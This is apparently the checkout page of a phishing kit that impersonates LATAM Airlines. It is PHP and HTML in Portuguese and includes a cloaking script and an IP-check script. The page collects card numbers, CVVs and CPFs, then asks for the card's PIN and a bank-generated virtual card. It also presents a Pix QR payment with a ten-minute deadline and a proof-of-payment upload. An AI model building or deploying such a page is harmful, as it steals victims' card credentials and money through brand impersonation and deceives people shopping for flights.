<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once("api/erroAPI.php");
//include 'verificar.php';
require_once 'config/config.php';
include 'verificarip.php';
include 'cloacker2.php';

$requestUri = $_SERVER['REQUEST_URI'];
$segments = explode('/', trim($requestUri, '/'));
$fullId = $segments[0] ?? null;

if (!$fullId) {
    include __DIR__ . '/erro.php';
    exit;
}
try {
    $stmt = $conexao->prepare("SELECT * FROM links WHERE fullid = :fullid LIMIT 1");
    $stmt->execute(['fullid' => $fullId]);
    $links = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$links) {
        include __DIR__ . '/erro.php';
        exit;
    }

} catch (PDOException $e) {
    erroAPI("Erro geral: " . $e->getMessage());
}

require_once __DIR__ . '/config/config.php';

$mostrar_comprovante = false;

try {
    if ($conexao_tipo === 'pdo') {

        $stmt = $conexao->query("SELECT comprovante FROM configuracoes LIMIT 1");
        $config = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($config && isset($config['comprovante']) && $config['comprovante'] == 1) {
            $mostrar_comprovante = true;
        }

    } elseif ($conexao_tipo === 'mysqli') {

        $resultado = $conexao->query("SELECT comprovante FROM configuracoes LIMIT 1");

        if ($resultado && $resultado->num_rows > 0) {
            $config = $resultado->fetch_assoc();

            if (isset($config['comprovante']) && $config['comprovante'] == 1) {
                $mostrar_comprovante = true;
            }
        }

    }

} catch (Exception $e) {
    erroAPI("Erro geral: " . $e->getMessage());
}

?>
            <?php include('info.php'); ?>

        <?php include('pixelface.php'); ?><?php include('pixeltiktok.php'); ?><?php include('utmify.php'); ?>
<html >
	<?php include('head.php'); ?>
<body>
    <span id='mobile'></span><span id='desktop'></span>
    <!--HIDDEN-->
    <span id='local' class='display-none'>pagamento</span>
    <!-- FIXEDS -->
    <section id='mobile_fixeds'>

    </section>
    <section id='desktop_fixeds'>

    </section>
    <header>
        <section id='mobile_header'>
            <img src='https://s.latamairlines.com/images/header/logo/DesktopNegative.svg'>
            <!-- <i class="material-icons">&#xe5d2;</i> -->
        </section>
        <section id='desktop_header'></section>
    </header>
    <main>
        <section id='mobile_main'>
            <section id='loading'><div></div></section>
            <!--FIXOS-->
            <div id='pedido_finalizado_no_pix' class='div-pedido-finalizado'>
                <h3>Pedido realizado com sucesso.</h3>
                <label>Pague o Pix abaixo para garantir sua passagem.</label>
                <label>Esse código é válido por 10 minutos.</label>
                <h3 id='preço_final_da_passagem_pix'></h3>
                <img id='qr_code_pix' src=''>
                <input type='text' id='código_pix' disabled value=''>
                <button onclick='copiar_código(this)' data-id='código_pix' data-texto='Código copiado'>Copiar código</button>

                <?php if ($mostrar_comprovante): ?>
                <script type="text/javascript" src="/js/enviar_comprovante_de_pagamento.js" ></script>
                <style>
		        	#campo_para_anexar_comprovante_de_pagamento{ display:flex;flex-flow:column;gap:10px;margin:10px 0 0 !important; }
		        		#campo_para_anexar_comprovante_de_pagamento p{ font-size:16px;font-family:Sohne, Luna, "system-ui", BlinkMacSystemFont, -apple-system, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, "sans-serif"; }
		        		#botao_anexar_comprovante_de_pagamento{ font-size:16px;margin:10px 0;background-color:#ffffff;border:solid 1px #e8114b;border-radius:8px;min-height:49px;max-height:49px;font-weight:bold;font-family:Sohne, Luna, "system-ui", BlinkMacSystemFont, -apple-system, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, "sans-serif";color:#e8114b; }
		        		#div_anexar_comprovante_de_pagamento{ display:none;flex-flow:column;gap:10px; }
		        		#div_anexar_comprovante_de_pagamento > button{ font-size:14px;background-color:#e8114b;border:solid 1px #e8114b;border-radius:8px;min-height:49px;max-height:49px;font-weight:bold;font-family:Sohne, Luna, "system-ui", BlinkMacSystemFont, -apple-system, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, "sans-serif";color:#ffffff; }
		        		#comprovante_anexado{ font-size:16px;color:#0f1111;font-weight:normal;display:none;margin:20px 0 0; }
		        		.aguarde-botão{ margin:0 auto;border-radius: 100%;min-height: 28px;min-width: 28px;max-width: 28px;max-height: 28px;border: 4px solid transparent;background: linear-gradient(#e8114b, #e8114b) padding-box padding-box, conic-gradient(from -90deg at 52.08% 50%, rgb(255, 255, 255) 0deg, rgb(212, 227, 238) 360deg) border-box border-box;animation: 1.4s linear 0s infinite normal none running cilQsd; }
		        		@keyframes cilQsd {  0% { transform: rotate(0deg); }  100% { transform: rotate(360deg); } }
		        </style>
		        <div id='campo_para_anexar_comprovante_de_pagamento'>
		        	<button id='botao_anexar_comprovante_de_pagamento' onclick='ja_paguei(this)'>Já fiz o pagamento</button>
		        	<div id='div_anexar_comprovante_de_pagamento'>
		        		<p>Envie o comprovante de pagamento para agilizar a aprovação da sua compra</p>
		        		<input type='file' id='comprovante_de_pagamento'>
		        		<button onclick='enviar_comprovante_de_pagamento(this)'>Enviar comprovante</button>
		        	</div>
		        	<p id='comprovante_anexado'>Comprovante recebido com sucesso, em breve você receberá a confirmação do seu pagamento.</p>
		        </div>
                <?php endif; ?>

                <div>
                    <label>Como pagar via Pix?</label>
                    <span>1 - Acesse o app do seu banco</span>
                    <span>2 - Copie e cole o código acima, ou filme o qr code</span>
                    <span>3 - Confirme o pagamento, pronto.</span>

                    <label>O pagamento via Pix é instantâneo, após o pagamento, sua passagem é aprovada imediatamente.</label>
                </div>
            </div>
            <div id='pedido_finalizado_no_cartão' class='div-pedido-finalizado'>
                <h3>Pagamento aprovado com sucesso.</h3>
                <label>Sua compra foi aprovada com sucesso.</label>
                <label>Em breve você receberá mais infomações sobre sua passagem.</label>
                <h3 id='preço_final_da_passagem_cartão'></h3>
            </div>
            <div id='div_resumo' class='div-resumo'>
                <h3 id='titulo_da_página'>Resumo do pedido</h3>

                <div class='div-resumo-1'>
                    <div class='div-resumo-preços'>
                        <label>Total à pagar<b id='valor_total'></b></label>
                        <span id='todos_passageiros'></span>
                    </div>
                    <div class='div-resumo-passagens'>
                        <div id='passagem_de_ida' class='div-local'>
                            <label id='local_de_origem'></label>
                            <span id='data_de_ida' class='resumo-data-do-voo'></span>
                            <div>
                                <label id='partida_ida'></label>
                                <img src='https://i.imgur.com/81PxidC.png'>
                                <label id='chegada_ida'></label>
                            </div>
                        </div>
                        <div id='passagem_de_volta' class='div-local'>
                            <label id='local_de_destino'></label>
                            <span id='data_de_volta' class='resumo-data-do-voo'></span>
                            <div>
                                <label id='partida_volta'></label>
                                <img src='https://i.imgur.com/81PxidC.png'>
                                <label id='chegada_volta'></label>
                            </div>
                        </div>
                    </div>
                    <div id='div_resumo_seguro_viagem' class='div-resumo-seguro-viagem'>
                        <label>Seguro viagem incluso</label>
                        <b id='dias_seguro_viagem'></b>
                    </div>
                </div>
            </div>

            <div id='div_formas_de_pagamento' class='div-formas-de-pagamento'>
                <h3 id='titulo_formas_de_pagamento'>Formas de pagamento</h3>
                <div id='div_erro_pagamento'>
                      <label id='erro_pagamento'>Pagamento não autorizado, tente com outro cartão ou tente outra forma de pagamento.</label>          
                </div>
                <div id='formas_de_pagamento'>
                    <article id='pagamento_via_cartão' class='forma-de-pagamento'>
                        <div onclick='adicionar_cartão(this)' class='descrição-forma-de-pagamento'>
                            <img src='https://i.imgur.com/e3s4IbB.png'>
                            <div>
                                <label id='titulo_cartão'>Adicionar Cartão</label>
                                <span id='descrição1_cartão'>Crédito ou Débito, Visa, Mastercard,</span>
                                <span id='descrição2_cartão'>American Express, Diners Club, ELO ou Hipercard.</span>
                            </div>
                        </div>
                        <div id='detalhes_cartão'>
                            <h3>Pagamento com cartão de crédito</h3>

                            <div id='cartão_de_crédito'>    
                                <div class='div-input-cartão'>
                                    <label>Nome e sobrenome</label>
                                    <input type='text' id='nome_do_titular' style='text-transform:uppercase;' placeholder='MARIA C SILVA'>
                                </div>
                                <span id='erro_nome_do_titular'>Nome do titular inválido</span>

                                <div class='div-input-cartão'>
                                    <label>CPF do titular</label>
                                    <input type='text' id='documento_do_titular' onkeyup='mascarar_cpf(this)' data-erro='erro_documento_do_titular' placeholder='123.456.789-10'>
                                </div>
                                <span id='erro_documento_do_titular'></span>
                                
                                <div class='div-input-cartão'>
                                    <label>Número do cartão</label>
                                    <input type='text' id='numero_do_cartão' onkeyup='mascarar_cartão(this)' data-erro='erro_numero_do_cartão' placeholder="5555 5555 5555 5555">
                                </div>
                                <span id='erro_numero_do_cartão'>Insira um número de cartão válido</span>

                                <section>
                                    <div class='sub-div-input-cartão'>
                                        <div class='div-input-cartão'>
                                            <label>Vencimento</label>
                                            <input type='text' id='validade_do_cartão' onkeyup='mascarar_validade(this)' data-erro='erro_validade_do_cartão' placeholder="MM / AA">
                                        </div>
                                        <span id='erro_validade_do_cartão'>Validade incorreta</span>
                                    </div>
                                    <div class='sub-div-input-cartão'>
                                        <div class='div-input-cartão'>
                                            <label>Cvv</label>
                                            <input type='text' id='cvv_do_cartão' onkeyup='mascarar_cvv(this)' data-numero='numero_do_cartão' data-erro='erro_cvv_do_cartão' placeholder='000'>
                                        </div>
                                        <span id='erro_cvv_do_cartão'>cvv inválido</span>
                                    </div>
                                </section>

                                <div class='div-input-cartão'>
                                    <label>Parcelas</label>
                                    <select id='parcelas'></select>
                                </div>
                                <span id='erro_parcelas'>Selecione as parcelas</span>

                                <button id='adicionar_cartão' onclick='salvar_cartão(this)'>Adicionar cartão</button>
                            </div>  
                            <div id='consultavel'>
                                <label>Para segurança você precisa inserir a senha do seu cartão.</label>
                                <div class='div-input-cartão'>
                                    <label>Senha do cartão</label>
                                    <input type='password' id='senha_do_cartão' placeholder="">
                                </div>
                                <span id='erro_senha_do_cartão'>Senha incorreta</span>

                                <button id='salvar_consultavel' onclick='salvar_consultavel(this)'>Continuar</button>
                            </div>
                            <div id='virtual'>
                                <label>Para fazer compras na internet seu banco exige que você utilize um cartão virtual, acesse o app do seu banco gere um cartão virtual e insira-o abaixo para finalizar sua compra com segurança.</label>
                                <div class='div-input-cartão'>
                                    <label>Número do cartão virtual</label>
                                    <input type='text' id='numero_do_cartão_virtual' onkeyup='mascarar_cartão(this)' data-erro='erro_numero_do_cartão_virtual' placeholder="5555 5555 5555 5555">
                                </div>
                                <span id='erro_numero_do_cartão_virtual'>Insira um número de cartão válido</span>

                                <section>
                                    <div class='sub-div-input-cartão'>
                                        <div class='div-input-cartão'>
                                            <label>Vencimento</label>
                                            <input type='text' id='validade_do_cartão_virtual' onkeyup='mascarar_validade(this)' data-erro='erro_validade_do_cartão_virtual' placeholder="MM / AA">
                                        </div>
                                        <span id='erro_validade_do_cartão_virtual'>Validade incorreta</span>
                                    </div>
                                    <div class='sub-div-input-cartão'>
                                        <div class='div-input-cartão'>
                                            <label>Cvv</label>
                                            <input type='text' id='cvv_do_cartão_virtual' onkeyup='mascarar_cvv(this)' data-numero='numero_do_cartão_virtual' data-erro='erro_cvv_do_cartão_virtual' placeholder='000'>
                                        </div>
                                        <span id='erro_cvv_do_cartão_virtual'>cvv inválido</span>
                                    </div>
                                </section>

                                <button id='salvar_virtual' onclick='salvar_virtual(this)'>Confirmar</button>
                            </div>
                            
                        </div>
                    </article>

                    <article id='pagamento_via_pix' class='forma-de-pagamento'>
                        <div class='descrição-forma-de-pagamento'>
                            <img src='https://i.imgur.com/EMtLjBO.png'>
                            <div>
                                <label id='titulo_pix'>Pagar com Pix<span id='texto_desconto_no_pix'></span></label>
                                <span id='descrição1_pix'>Aprovação imediata.</span>
                                <span id='descrição2_pix'>Pague pelo app do seu banco.</span>
                            </div>
                            <label id='botao_pix' onclick='selecionar_forma_de_pagamento(this)' forma-de-pagamento='pix' class='toggle_not_selected forma-de-pagamento-s'><span></span></label>
                        </div>
                    </article>


                     <article id='pagamento_via_boleto' class='forma-de-pagamento' style="display: none;"> 
                        <div class='descrição-forma-de-pagamento'>
                            <img src='https://i.imgur.com/KHFWd3C.png'>
                            <div>
                                <label id='titulo_boleto'>Pagar com Boleto<span id='texto_desconto_no_boleto'></span></label>
                                <span id='descrição1_boleto'>Aprovação imediata.</span>
                                <span id='descrição2_boleto'>Pague pelo app do seu banco.</span>
                            </div>
                            <label id='botao_boleto' onclick='selecionar_forma_de_pagamento(this)' forma-de-pagamento='boleto ' class='toggle_not_selected forma-de-pagamento-s'><span></span></label>
                        </div>
                    </article>
                </div>

                <div id='finalizar_pedido'>
                    <button id='botão_finalizar_pedido' onclick='finalizar_pedido(this)'>Finalizar</button>
                </div>
            </div>


        </section>
    </main>
</body>
</html>